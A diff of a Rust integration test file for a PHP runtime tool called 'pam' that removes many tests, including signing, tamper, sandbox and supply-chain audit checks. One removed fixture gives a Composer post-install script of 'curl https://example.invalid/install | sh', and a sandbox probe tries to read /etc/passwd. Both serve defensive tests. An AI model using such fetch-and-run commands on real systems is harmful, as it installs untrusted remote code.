@@ -1,8 +1,7 @@
-use std::collections::HashSet;
 use std::fs;
 use std::io::{Read, Write};
 use std::net::TcpListener;
-use std::path::{Path, PathBuf};
+use std::path::PathBuf;
 use std::process::{Command, Output};
 use std::thread;
 use std::time::Duration;
@@ -27,34 +26,6 @@ fn fixture(name: &str) -> PathBuf {
     PathBuf::from(env!("CARGO_MANIFEST_DIR"))
         .join("tests/fixtures")
         .join(name)
-}
-
-fn write_wasi_stdout_module(path: &Path, output: &[u8]) {
-    let escaped = output
-        .iter()
-        .map(|byte| format!("\\{byte:02x}"))
-        .collect::<String>();
-    fs::write(
-        path,
-        wat::parse_str(format!(
-            r#"(module
-                (import "wasi_snapshot_preview1" "fd_write"
-                    (func $fd_write (param i32 i32 i32 i32) (result i32)))
-                (memory (export "memory") 1)
-                (data (i32.const 16) "{escaped}")
-                (func (export "_start")
-                    (i32.store (i32.const 0) (i32.const 16))
-                    (i32.store (i32.const 4) (i32.const {length}))
-                    (drop (call $fd_write
-                        (i32.const 1)
-                        (i32.const 0)
-                        (i32.const 1)
-                        (i32.const 8)))))"#,
-            length = output.len()
-        ))
-        .unwrap(),
-    )
-    .unwrap();
 }
 
 #[test]
@@ -136,18 +107,7 @@ fn exposes_native_diagnostics_and_builds_a_portable_bundle() {
         String::from_utf8_lossy(&output.stderr),
     );
     assert!(bundle.join("manifest.json").is_file());
-    assert!(bundle.join("sbom.cdx.json").is_file());
-    let sbom: serde_json::Value =
-        serde_json::from_slice(&fs::read(bundle.join("sbom.cdx.json")).unwrap()).unwrap();
-    assert_eq!(sbom["bomFormat"], "CycloneDX");
-    assert_eq!(sbom["specVersion"], "1.6");
     assert!(bundle.join("lib").read_dir().unwrap().next().is_some());
-    let verified = run_pam(&["verify", bundle.to_str().unwrap()]);
-    assert!(
-        verified.status.success(),
-        "{}",
-        String::from_utf8_lossy(&verified.stderr)
-    );
     let bundled = Command::new(bundle.join("bin/pam-run")).output().unwrap();
     assert!(
         bundled.status.success(),
@@ -158,170 +118,8 @@ fn exposes_native_diagnostics_and_builds_a_portable_bundle() {
         String::from_utf8_lossy(&bundled.stdout),
         "Hello from PHP!\n"
     );
-    fs::write(bundle.join("app/index.php"), "<?php echo 'tampered';").unwrap();
-    let rejected = run_pam(&["verify", bundle.to_str().unwrap()]);
-    assert!(!rejected.status.success());
-    assert!(
-        String::from_utf8_lossy(&rejected.stderr).contains("mismatch"),
-        "{}",
-        String::from_utf8_lossy(&rejected.stderr)
-    );
     fs::remove_dir_all(project).unwrap();
     fs::remove_dir_all(bundle).unwrap();
-}
-
-#[test]
-fn signs_and_verifies_a_production_bundle_with_external_ed25519_trust() {
-    let project = temporary_path("signed-build-project");
-    let bundle = temporary_path("signed-build-bundle");
-    let private_key = temporary_path("signed-build-private.pem");
-    let public_key = temporary_path("signed-build-public.pem");
-    fs::create_dir(&project).unwrap();
-    fs::copy(fixture("hello.php"), project.join("index.php")).unwrap();
-    let generated = Command::new("openssl")
-        .args(["genpkey", "-algorithm", "ED25519", "-out"])
-        .arg(&private_key)
-        .output()
-        .unwrap();
-    assert!(
-        generated.status.success(),
-        "{}",
-        String::from_utf8_lossy(&generated.stderr)
-    );
-    let exported = Command::new("openssl")
-        .args(["pkey", "-in"])
-        .arg(&private_key)
-        .args(["-pubout", "-out"])
-        .arg(&public_key)
-        .output()
-        .unwrap();
-    assert!(
-        exported.status.success(),
-        "{}",
-        String::from_utf8_lossy(&exported.stderr)
-    );
-
-    let built = run_pam(&[
-        "build",
-        project.to_str().unwrap(),
-        "--output",
-        bundle.to_str().unwrap(),
-        "--signing-key",
-        private_key.to_str().unwrap(),
-    ]);
-    assert!(
-        built.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&built.stdout),
-        String::from_utf8_lossy(&built.stderr)
-    );
-    assert!(bundle.join("manifest.sig").is_file());
-
-    let untrusted = run_pam(&["verify", bundle.to_str().unwrap()]);
-    assert!(!untrusted.status.success());
-    assert!(
-        String::from_utf8_lossy(&untrusted.stderr).contains("--public-key"),
-        "{}",
-        String::from_utf8_lossy(&untrusted.stderr)
-    );
-    let trusted = run_pam(&[
-        "verify",
-        bundle.to_str().unwrap(),
-        "--public-key",
-        public_key.to_str().unwrap(),
-        "--require-signature",
-    ]);
-    assert!(
-        trusted.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&trusted.stdout),
-        String::from_utf8_lossy(&trusted.stderr)
-    );
-
-    let manifest_path = bundle.join("manifest.json");
-    let mut manifest: serde_json::Value =
-        serde_json::from_slice(&fs::read(&manifest_path).unwrap()).unwrap();
-    manifest["pamVersion"] = serde_json::json!("9.9.9");
-    fs::write(
-        &manifest_path,
-        serde_json::to_vec_pretty(&manifest).unwrap(),
-    )
-    .unwrap();
-    let tampered = run_pam(&[
-        "verify",
-        bundle.to_str().unwrap(),
-        "--public-key",
-        public_key.to_str().unwrap(),
-    ]);
-    assert!(!tampered.status.success());
-    assert!(
-        String::from_utf8_lossy(&tampered.stderr).contains("signature verification failed"),
-        "{}",
-        String::from_utf8_lossy(&tampered.stderr)
-    );
-
-    fs::remove_dir_all(project).unwrap();
-    fs::remove_dir_all(bundle).unwrap();
-    fs::remove_file(private_key).unwrap();
-    fs::remove_file(public_key).unwrap();
-}
-
-#[cfg(target_os = "linux")]
-#[test]
-fn enforces_kernel_capabilities_for_untrusted_php() {
-    let directory = temporary_path("kernel-sandbox");
-    fs::create_dir(&directory).unwrap();
-    fs::write(directory.join("allowed.txt"), "allowed").unwrap();
-    fs::write(
-        directory.join("pam.capabilities.json"),
-        r#"{
-  "schemaVersion": 1,
-  "capabilities": [
-    {"kind": 1, "resources": ["."]},
-    {"kind": 5, "resources": ["PAM_ALLOWED_TEST"]}
-  ]
-}"#,
-    )
-    .unwrap();
-    fs::write(
-        directory.join("plugin.php"),
-        r#"<?php
-echo json_encode([
-    'allowedFile' => file_get_contents(__DIR__ . '/allowed.txt'),
-    'deniedFile' => @file_get_contents('/etc/passwd') === false,
-    'allowedEnvironment' => getenv('PAM_ALLOWED_TEST'),
-    'hiddenEnvironment' => getenv('PAM_HIDDEN_TEST') === false,
-    'networkDenied' => @stream_socket_client('tcp://127.0.0.1:9') === false,
-    'processDenied' => @proc_open(['/bin/true'], [], $pipes) === false,
-], JSON_THROW_ON_ERROR);
-"#,
-    )
-    .unwrap();
-
-    let output = Command::new(env!("CARGO_BIN_EXE_pam"))
-        .arg("sandbox")
-        .arg(directory.join("pam.capabilities.json"))
-        .arg("--")
-        .arg(directory.join("plugin.php"))
-        .env("PAM_ALLOWED_TEST", "visible")
-        .env("PAM_HIDDEN_TEST", "must-not-leak")
-        .output()
-        .unwrap();
-    assert!(
-        output.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr),
-    );
-    let contract: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(contract["allowedFile"], "allowed");
-    assert_eq!(contract["deniedFile"], true);
-    assert_eq!(contract["allowedEnvironment"], "visible");
-    assert_eq!(contract["hiddenEnvironment"], true);
-    assert_eq!(contract["networkDenied"], true);
-    assert_eq!(contract["processDenied"], true);
-
-    fs::remove_dir_all(directory).unwrap();
 }
 
 #[cfg(unix)]
@@ -437,13 +235,6 @@ fn runs_fibers_and_isolated_process_tasks() {
     );
     assert_eq!(payload["context"], "fiber-context");
     assert_eq!(payload["deadlineExpired"], true);
-    assert_eq!(payload["groupConcurrent"], true);
-    assert_eq!(
-        payload["groupValues"],
-        serde_json::json!({"first": "one", "second": "two"})
-    );
-    assert_eq!(payload["cancelledSiblingCleaned"], true);
-    assert_eq!(payload["groupFailedFast"], true);
     assert!(
         payload["dns"]
             .as_array()
@@ -466,753 +257,6 @@ fn runs_fibers_and_isolated_process_tasks() {
     assert_eq!(payload["successful"], true);
     assert_eq!(payload["timedOut"], 2);
     assert_eq!(payload["values"], serde_json::json!(["first", "second"]));
-}
-
-#[test]
-fn resumes_idempotent_durable_workflows_and_compensates_failures() {
-    let directory = temporary_path("durable-workflows");
-    fs::create_dir(&directory).unwrap();
-    let database = directory.join("workflows.sqlite");
-    let marker = directory.join("retry.marker");
-    let output = run_pam(&[
-        fixture("workflows.php").to_str().unwrap(),
-        database.to_str().unwrap(),
-        marker.to_str().unwrap(),
-    ]);
-    assert!(
-        output.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr),
-    );
-    let contract: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(contract["waitingState"], 3);
-    assert_eq!(contract["completedState"], 4);
-    assert_eq!(
-        contract["completedResult"],
-        serde_json::json!({
-            "charge": "charged-42",
-            "receipt": "receipt-charged-42",
-        })
-    );
-    assert_eq!(contract["deduplicatedId"], contract["originalId"]);
-    assert_eq!(
-        contract["deduplicatedWhileLeasedId"],
-        contract["originalId"]
-    );
-    assert_eq!(contract["deduplicatedWhileLeasedState"], 3);
-    assert_eq!(contract["compensatedState"], 7);
-    assert_eq!(contract["compensations"][0][1], "reservation-1");
-    assert_eq!(contract["lostLeaseErrors"], 1);
-    assert_eq!(contract["stateAfterLeaseLoss"], 2);
-    assert_eq!(contract["recoveredLeaseCompleted"], 1);
-    assert_eq!(contract["stateAfterLeaseRecovery"], 4);
-    assert_eq!(contract["claimed"], 1);
-    assert_eq!(contract["contended"], 0);
-    assert_eq!(contract["wrongOwnerRejected"], true);
-    assert_eq!(
-        contract["activityKey"],
-        format!("{}:receipt", contract["originalId"].as_str().unwrap())
-    );
-    assert_eq!(contract["staleClaims"], 2);
-    assert_eq!(contract["recoveredClaims"], 2);
-    assert_eq!(contract["schedulerClaimed"], 2);
-    assert_eq!(contract["schedulerCompleted"], 2);
-    assert_eq!(contract["schedulerErrors"], serde_json::json!([]));
-    assert_eq!(
-        contract["legacyLeaseColumns"],
-        serde_json::json!(["lease_owner", "lease_expires_at"])
-    );
-    assert!(database.is_file());
-    fs::remove_dir_all(directory).unwrap();
-}
-
-#[test]
-fn generates_portable_contracts_from_php_dtos_and_integer_enums() {
-    let directory = temporary_path("typed-contracts");
-    let output = run_pam(&[
-        "contracts",
-        fixture("contracts.php").to_str().unwrap(),
-        "--output",
-        directory.to_str().unwrap(),
-    ]);
-    assert!(
-        output.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr),
-    );
-
-    for name in [
-        "contracts.schema.json",
-        "openapi.components.json",
-        "contracts.mobile.json",
-        "contracts.forms.json",
-        "contracts.mcp.json",
-        "contracts.migrations.json",
-        "contracts.ts",
-        "Contracts.kt",
-        "CONTRACTS.md",
-    ] {
-        assert!(directory.join(name).is_file(), "missing generated {name}");
-    }
-
-    let schema: serde_json::Value =
-        serde_json::from_slice(&fs::read(directory.join("contracts.schema.json")).unwrap())
-            .unwrap();
-    assert_eq!(
-        schema["$defs"]["OrderStatus"]["enum"],
-        serde_json::json!([1, 2, 3])
-    );
-    assert_eq!(
-        schema["$defs"]["CreateOrder"]["properties"]["shipping"]["anyOf"][0]["$ref"],
-        "#/$defs/Address"
-    );
-    assert_eq!(
-        schema["$defs"]["CreateOrder"]["properties"]["tags"]["items"]["type"],
-        "string"
-    );
-
-    let openapi: serde_json::Value =
-        serde_json::from_slice(&fs::read(directory.join("openapi.components.json")).unwrap())
-            .unwrap();
-    assert_eq!(
-        openapi["components"]["schemas"]["CreateOrder"]["properties"]["status"]["$ref"],
-        "#/components/schemas/OrderStatus"
-    );
-
-    let typescript = fs::read_to_string(directory.join("contracts.ts")).unwrap();
-    let kotlin = fs::read_to_string(directory.join("Contracts.kt")).unwrap();
-    assert!(typescript.contains("export interface CreateOrder"));
-    assert!(typescript.contains("Pending = 1"));
-    assert!(kotlin.contains("data class CreateOrder"));
-    assert!(kotlin.contains("Pending(1)"));
-
-    let second = run_pam(&[
-        "contracts",
-        fixture("contracts.php").to_str().unwrap(),
-        "--output",
-        directory.to_str().unwrap(),
-    ]);
-    assert!(!second.status.success());
-    assert!(String::from_utf8_lossy(&second.stderr).contains("refusing to overwrite"));
-    fs::remove_dir_all(directory).unwrap();
-}
-
-#[test]
-fn validates_generates_and_executes_typed_rpc_through_wasi() {
-    let root = temporary_path("typed-rpc");
-    fs::create_dir(&root).unwrap();
-    let contracts = root.join("contracts");
-    let generated = run_pam(&[
-        "contracts",
-        fixture("contracts.php").to_str().unwrap(),
-        "--output",
-        contracts.to_str().unwrap(),
-    ]);
-    assert!(
-        generated.status.success(),
-        "{}",
-        String::from_utf8_lossy(&generated.stderr)
-    );
-
-    let manifest = root.join("pam.rpc.json");
-    fs::write(
-        &manifest,
-        serde_json::to_vec_pretty(&serde_json::json!({
-            "schemaVersion": 1,
-            "service": "Orders",
-            "version": "1.0.0",
-            "methods": [{
-                "kind": 1,
-                "name": "createOrder",
-                "input": "CreateOrder",
-                "output": "CreateOrder",
-                "timeoutMs": 1000,
-                "idempotent": true
-            }]
-        }))
-        .unwrap(),
-    )
-    .unwrap();
-    let mobile_contracts = contracts.join("contracts.mobile.json");
-    let validation = run_pam(&[
-        "rpc",
-        "validate",
-        manifest.to_str().unwrap(),
-        "--contracts",
-        mobile_contracts.to_str().unwrap(),
-    ]);
-    assert!(
-        validation.status.success(),
-        "{}",
-        String::from_utf8_lossy(&validation.stderr)
-    );
-    assert!(String::from_utf8_lossy(&validation.stdout).contains("TYPED RPC VALID"));
-
-    let sdk = root.join("sdk");
-    let generation = run_pam(&[
-        "rpc",
-        "generate",
-        manifest.to_str().unwrap(),
-        "--contracts",
-        mobile_contracts.to_str().unwrap(),
-        "--output",
-        sdk.to_str().unwrap(),
-    ]);
-    assert!(
-        generation.status.success(),
-        "{}",
-        String::from_utf8_lossy(&generation.stderr)
-    );
-    for file in [
-        "pam-rpc.manifest.json",
-        "pam-rpc.ts",
-        "pam_rpc.py",
-        "pam_rpc.rs",
-        "RPC.md",
-    ] {
-        assert!(
-            sdk.join(file).is_file(),
-            "missing generated RPC file {file}"
-        );
-    }
-    assert!(
-        fs::read_to_string(sdk.join("pam-rpc.ts"))
-            .unwrap()
-            .contains("class OrdersClient")
-    );
-    assert!(
-        fs::read_to_string(sdk.join("pam_rpc.py"))
-            .unwrap()
-            .contains("async def create_order")
-    );
-    assert!(
-        fs::read_to_string(sdk.join("pam_rpc.rs"))
-            .unwrap()
-            .contains("pub fn create_order")
-    );
-
-    let request = serde_json::json!({
-        "id": "10000000-0000-4000-8000-000000000001",
-        "quantity": 2,
-        "shipping": null,
-        "status": 1,
-        "tags": ["fast", "typed"]
-    });
-    let request_path = root.join("request.json");
-    fs::write(&request_path, serde_json::to_vec(&request).unwrap()).unwrap();
-    let response = serde_json::json!({
-        "protocolVersion": 1,
-        "id": "rpc-test-1",
-        "kind": 2,
-        "result": request,
-    });
-    let response_bytes = response.to_string() + "\n";
-    let module = root.join("orders.wasm");
-    write_wasi_stdout_module(&module, response_bytes.as_bytes());
-    let invocation = run_pam(&[
-        "rpc",
-        "wasi",
-        manifest.to_str().unwrap(),
-        module.to_str().unwrap(),
-        "createOrder",
-        request_path.to_str().unwrap(),
-        "--contracts",
-        mobile_contracts.to_str().unwrap(),
-        "--request-id",
-        "rpc-test-1",
-    ]);
-    assert!(
-        invocation.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&invocation.stdout),
-        String::from_utf8_lossy(&invocation.stderr)
-    );
-    let result: serde_json::Value = serde_json::from_slice(&invocation.stdout).unwrap();
-    assert_eq!(result["quantity"], 2);
-    assert_eq!(result["status"], 1);
-
-    let mut unexpected_response = response;
-    unexpected_response
-        .as_object_mut()
-        .unwrap()
-        .insert("debug".to_owned(), serde_json::json!(true));
-    write_wasi_stdout_module(&module, (unexpected_response.to_string() + "\n").as_bytes());
-    let unexpected = run_pam(&[
-        "rpc",
-        "wasi",
-        manifest.to_str().unwrap(),
-        module.to_str().unwrap(),
-        "createOrder",
-        request_path.to_str().unwrap(),
-        "--contracts",
-        mobile_contracts.to_str().unwrap(),
-        "--request-id",
-        "rpc-test-1",
-    ]);
-    assert!(!unexpected.status.success());
-    assert!(String::from_utf8_lossy(&unexpected.stderr).contains("unknown fields"));
-
-    fs::write(
-        &request_path,
-        br#"{"id":"10000000-0000-4000-8000-000000000001","status":1,"tags":[],"shipping":null}"#,
-    )
-    .unwrap();
-    let invalid = run_pam(&[
-        "rpc",
-        "wasi",
-        manifest.to_str().unwrap(),
-        module.to_str().unwrap(),
-        "createOrder",
-        request_path.to_str().unwrap(),
-        "--contracts",
-        mobile_contracts.to_str().unwrap(),
-    ]);
-    assert!(!invalid.status.success());
-    assert!(String::from_utf8_lossy(&invalid.stderr).contains("$request.quantity is required"));
-    fs::remove_dir_all(root).unwrap();
-}
-
-#[test]
-fn coordinates_cluster_discovery_leases_limits_breakers_queues_and_presence() {
-    let output = run_pam(&[fixture("cluster-services.php").to_str().unwrap()]);
-    assert!(
-        output.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr),
-    );
-    let contract: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(contract["initialNodeStates"], serde_json::json!([1, 2]));
-    assert_eq!(contract["remainingNode"], "node-b");
-    assert_eq!(contract["contended"], true);
-    assert_eq!(contract["renewedFence"], 1);
-    assert_eq!(contract["forgedRelease"], false);
-    assert_eq!(contract["newFence"], 2);
-    assert_eq!(contract["singleton"], true);
-    assert_eq!(
-        contract["rates"],
-        serde_json::json!([true, true, false, true])
-    );
-    assert_eq!(
-        contract["circuits"],
-        serde_json::json!([1, 1, 2, false, 3, false, 1])
-    );
-    assert_eq!(contract["queueLength"], 2);
-    assert_eq!(contract["queue"], serde_json::json!(["b", "c", null]));
-    assert_eq!(
-        contract["presenceInitial"],
-        serde_json::json!(["alice", "bob"])
-    );
-    assert_eq!(contract["presenceAfterExpiry"], serde_json::json!(["bob"]));
-    assert_eq!(contract["presenceAfterLeave"], serde_json::json!([]));
-}
-
-#[test]
-fn creates_verifies_runs_and_invalidates_bootstrap_snapshots() {
-    let project = temporary_path("bootstrap-snapshot");
-    fs::create_dir(&project).unwrap();
-    fs::write(
-        project.join("index.php"),
-        "<?php require __DIR__ . '/library.php'; echo snapshot_message(), \"\\n\";\n",
-    )
-    .unwrap();
-    fs::write(
-        project.join("library.php"),
-        "<?php function snapshot_message(): string { return 'snapshot-ready'; }\n",
-    )
-    .unwrap();
-    let manifest = project.join(".pam/bootstrap.snapshot.json");
-
-    let created = run_pam(&["snapshot", "create", project.to_str().unwrap()]);
-    assert!(
-        created.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&created.stdout),
-        String::from_utf8_lossy(&created.stderr),
-    );
-    assert!(manifest.is_file());
-
-    let unsigned = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-        "--require-signature",
-    ]);
-    assert!(!unsigned.status.success());
-    assert!(String::from_utf8_lossy(&unsigned.stderr).contains("snapshot is unsigned"));
-
-    let verified = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-    ]);
-    assert!(
-        verified.status.success(),
-        "{}",
-        String::from_utf8_lossy(&verified.stderr)
-    );
-
-    let executed = run_pam(&[
-        "snapshot",
-        "run",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-    ]);
-    assert!(
-        executed.status.success(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&executed.stdout),
-        String::from_utf8_lossy(&executed.stderr),
-    );
-    assert_eq!(
-        String::from_utf8_lossy(&executed.stdout),
-        "snapshot-ready\n"
-    );
-
-    fs::write(
-        project.join("library.php"),
-        "<?php function snapshot_message(): string { return 'changed'; }\n",
-    )
-    .unwrap();
-    let stale = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-    ]);
-    assert!(!stale.status.success());
-    assert!(String::from_utf8_lossy(&stale.stderr).contains("does not match current PHP files"));
-    fs::remove_dir_all(project).unwrap();
-}
-
-#[test]
-fn signs_bootstrap_snapshots_with_external_ed25519_trust() {
-    let project = temporary_path("signed-snapshot");
-    let private_key = temporary_path("snapshot-private.pem");
-    let public_key = temporary_path("snapshot-public.pem");
-    fs::create_dir(&project).unwrap();
-    fs::write(project.join("index.php"), "<?php echo 'trusted';\n").unwrap();
-    let generated = Command::new("openssl")
-        .args(["genpkey", "-algorithm", "ED25519", "-out"])
-        .arg(&private_key)
-        .output()
-        .unwrap();
-    assert!(generated.status.success());
-    let exported = Command::new("openssl")
-        .args(["pkey", "-in"])
-        .arg(&private_key)
-        .args(["-pubout", "-out"])
-        .arg(&public_key)
-        .output()
-        .unwrap();
-    assert!(exported.status.success());
-
-    let manifest = project.join(".pam/bootstrap.snapshot.json");
-    let signature = project.join(".pam/bootstrap.snapshot.json.sig");
-    let created = run_pam(&[
-        "snapshot",
-        "create",
-        project.to_str().unwrap(),
-        "--signing-key",
-        private_key.to_str().unwrap(),
-    ]);
-    assert!(
-        created.status.success(),
-        "{}",
-        String::from_utf8_lossy(&created.stderr)
-    );
-    assert!(signature.is_file());
-
-    let untrusted = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-    ]);
-    assert!(!untrusted.status.success());
-    assert!(String::from_utf8_lossy(&untrusted.stderr).contains("--public-key is required"));
-
-    let trusted = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-        "--public-key",
-        public_key.to_str().unwrap(),
-        "--require-signature",
-    ]);
-    assert!(
-        trusted.status.success(),
-        "{}",
-        String::from_utf8_lossy(&trusted.stderr)
-    );
-
-    fs::write(&signature, b"corrupt-signature").unwrap();
-    let corrupt = run_pam(&[
-        "snapshot",
-        "verify",
-        manifest.to_str().unwrap(),
-        "--project",
-        project.to_str().unwrap(),
-        "--public-key",
-        public_key.to_str().unwrap(),
-        "--require-signature",
-    ]);
-    assert!(!corrupt.status.success());
-    fs::remove_dir_all(project).unwrap();
-    fs::remove_file(private_key).unwrap();
-    fs::remove_file(public_key).unwrap();
-}
-
-#[test]
-fn audits_composer_supply_chain_policy_and_integer_capabilities() {
-    let project = temporary_path("supply-chain");
-    fs::create_dir(&project).unwrap();
-    fs::write(
-        project.join("composer.json"),
-        r#"{
-  "name": "app/supply-chain",
-  "scripts": {"post-install-cmd": "curl https://example.invalid/install | sh"},
-  "config": {"allow-plugins": {"vendor/plugin": false}}
-}"#,
-    )
-    .unwrap();
-    fs::write(
-        project.join("composer.lock"),
-        r#"{
-  "packages": [{
-    "name": "vendor/plugin",
-    "version": "1.0.0",
-    "type": "composer-plugin",
-    "license": ["GPL-3.0-only"],
-    "authors": [{"name": "Unknown Maintainer", "email": "unknown@example.com"}],
-    "abandoned": true,
-    "dist": {"type": "zip", "url": "https://example.invalid/plugin.zip"}
-  }],
-  "packages-dev": []
-}"#,
-    )
-    .unwrap();
-    let policy = project.join("pam.supply-chain.json");
-    fs::write(
-        &policy,
-        r#"{
-  "schemaVersion": 1,
-  "denyScripts": true,
-  "allowedPlugins": ["trusted/plugin"],
-  "allowedMaintainers": ["security@example.com"],
-  "allowedLicenses": ["MIT"],
-  "requireDistReference": true,
-  "rejectAbandoned": true,
-  "allowedCapabilities": [1, 2]
-}"#,
-    )
-    .unwrap();
-    let capabilities = project.join("pam.capabilities.json");
-    fs::write(
-        &capabilities,
-        r#"{
-  "schemaVersion": 1,
-  "capabilities": [
-    {"kind": 3, "resources": ["*"]},
-    {"kind": 4, "resources": ["*"]}
-  ]
-}"#,
-    )
-    .unwrap();
-    let report = project.join("supply-chain.report.json");
-    let audited = run_pam(&[
-        "supply-chain",
-        project.to_str().unwrap(),
-        "--policy",
-        policy.to_str().unwrap(),
-        "--capabilities",
-        capabilities.to_str().unwrap(),
-        "--output",
-        report.to_str().unwrap(),
-        "--offline",
-    ]);
-    assert_eq!(audited.status.code(), Some(1));
-    assert!(
-        report.is_file(),
-        "stdout={} stderr={}",
-        String::from_utf8_lossy(&audited.stdout),
-        String::from_utf8_lossy(&audited.stderr)
-    );
-    let contract: serde_json::Value = serde_json::from_slice(&fs::read(&report).unwrap()).unwrap();
-    assert_eq!(contract["schemaVersion"], 1);
-    assert_eq!(contract["verdict"], 3);
-    assert_eq!(contract["advisoryState"], 2);
-    assert_eq!(contract["packages"], 1);
-    assert_eq!(contract["capabilities"], serde_json::json!([3, 4]));
-    let kinds = contract["findings"]
-        .as_array()
-        .unwrap()
-        .iter()
-        .filter_map(|finding| finding["kind"].as_u64())
-        .collect::<HashSet<_>>();
-    assert!(kinds.is_superset(&HashSet::from([1, 2, 3, 4, 5, 6, 7, 8])));
-
-    let overwrite = run_pam(&[
-        "supply-chain",
-        project.to_str().unwrap(),
-        "--output",
-        report.to_str().unwrap(),
-        "--offline",
-    ]);
-    assert!(!overwrite.status.success());
-    assert!(String::from_utf8_lossy(&overwrite.stderr).contains("refusing to overwrite"));
-    fs::remove_dir_all(project).unwrap();
-}
-
-#[test]
-fn runs_wasi_with_bounded_output_memory_fuel_and_deadlines() {
-    let directory = temporary_path("wasi");
-    fs::create_dir(&directory).unwrap();
-    let hello = directory.join("hello.wasm");
-    fs::write(
-        &hello,
-        wat::parse_str(
-            r#"(module
-                (import "wasi_snapshot_preview1" "fd_write"
-                    (func $fd_write (param i32 i32 i32 i32) (result i32)))
-                (memory (export "memory") 1)
-                (data (i32.const 16) "PAM-WASI\n")
-                (func (export "_start")
-                    (i32.store (i32.const 0) (i32.const 16))
-                    (i32.store (i32.const 4) (i32.const 9))
-                    (drop (call $fd_write
-                        (i32.const 1)
-                        (i32.const 0)
-                        (i32.const 1)
-                        (i32.const 8)))))"#,
-        )
-        .unwrap(),
-    )
-    .unwrap();
-    let output = run_pam(&[
-        "wasi",
-        "run",
-        hello.to_str().unwrap(),
-        "--fuel",
-        "100000",
-        "--memory-bytes",
-        "65536",
-        "--max-output-bytes",
-        "64",
-        "--timeout-ms",
-        "1000",
-        "--",
-        "typed-guest-argument",
-    ]);
-    assert!(
-        output.status.success(),
-        "{}",
-        String::from_utf8_lossy(&output.stderr)
-    );
-    assert_eq!(output.stdout, b"PAM-WASI\n");
-    let output_limit = run_pam(&[
-        "wasi",
-        "run",
-        hello.to_str().unwrap(),
-        "--max-output-bytes",
-        "4",
-    ]);
-    assert!(!output_limit.status.success());
-    assert!(
-        String::from_utf8_lossy(&output_limit.stderr).contains("stdout exceeded"),
-        "{}",
-        String::from_utf8_lossy(&output_limit.stderr)
-    );
-    let unsafe_mapping = run_pam(&[
-        "wasi",
-        "run",
-        hello.to_str().unwrap(),
-        "--read-dir",
-        &format!("{}=../escape", directory.display()),
-    ]);
-    assert!(!unsafe_mapping.status.success());
-    assert!(
-        String::from_utf8_lossy(&unsafe_mapping.stderr).contains("safe HOST=GUEST"),
-        "{}",
-        String::from_utf8_lossy(&unsafe_mapping.stderr)
-    );
-
-    let exit = directory.join("exit.wasm");
-    fs::write(
-        &exit,
-        wat::parse_str(
-            r#"(module
-                (import "wasi_snapshot_preview1" "proc_exit"
-                    (func $proc_exit (param i32)))
-                (memory (export "memory") 1)
-                (func (export "_start")
-                    (call $proc_exit (i32.const 23))))"#,
-        )
-        .unwrap(),
-    )
-    .unwrap();
-    let exited = run_pam(&["wasi", "run", exit.to_str().unwrap()]);
-    assert_eq!(exited.status.code(), Some(23));
-
-    let oversized = directory.join("oversized.wasm");
-    fs::write(
-        &oversized,
-        wat::parse_str(r#"(module (memory 2) (func (export "_start")))"#).unwrap(),
-    )
-    .unwrap();
-    let memory = run_pam(&[
-        "wasi",
-        "run",
-        oversized.to_str().unwrap(),
-        "--memory-bytes",
-        "65536",
-    ]);
-    assert!(!memory.status.success());
-    assert!(
-        String::from_utf8_lossy(&memory.stderr).contains("memory"),
-        "{}",
-        String::from_utf8_lossy(&memory.stderr)
-    );
-
-    let spin = directory.join("spin.wasm");
-    fs::write(
-        &spin,
-        wat::parse_str(
-            r#"(module
-                (func (export "_start")
-                    (loop $spin
-                        (br $spin))))"#,
-        )
-        .unwrap(),
-    )
-    .unwrap();
-    let deadline = run_pam(&[
-        "wasi",
-        "run",
-        spin.to_str().unwrap(),
-        "--fuel",
-        "18446744073709551615",
-        "--timeout-ms",
-        "20",
-    ]);
-    assert!(!deadline.status.success());
-    assert!(
-        String::from_utf8_lossy(&deadline.stderr).contains("deadline"),
-        "{}",
-        String::from_utf8_lossy(&deadline.stderr)
-    );
-    fs::remove_dir_all(directory).unwrap();
 }
 
 #[test]
@@ -1320,30 +364,14 @@ fn exposes_inspect_routes_exec_help_and_version_commands() {
     let init_help = run_pam(&["init", "--help"]);
     assert!(init_help.status.success());
     let init_help = String::from_utf8_lossy(&init_help.stderr);
-    assert!(init_help.contains("desktop, or mobile"));
-    assert!(!init_help.contains("mobile-ui"));
+    assert!(init_help.contains("mobile, or mobile-ui"));
+    assert!(init_help.contains("--template mobile-ui"));
 
     let mobile_help = run_pam(&["mobile", "--help"]);
     assert!(mobile_help.status.success());
     let mobile_help = String::from_utf8_lossy(&mobile_help.stderr);
     assert!(mobile_help.contains("PAM / MOBILE"));
     assert!(mobile_help.contains("make:screen"));
-
-    let compatibility_help = run_pam(&["help", "compatibility"]);
-    assert!(compatibility_help.status.success());
-    let compatibility_help = String::from_utf8_lossy(&compatibility_help.stderr);
-    assert!(compatibility_help.contains("PAM / COMPATIBILITY"));
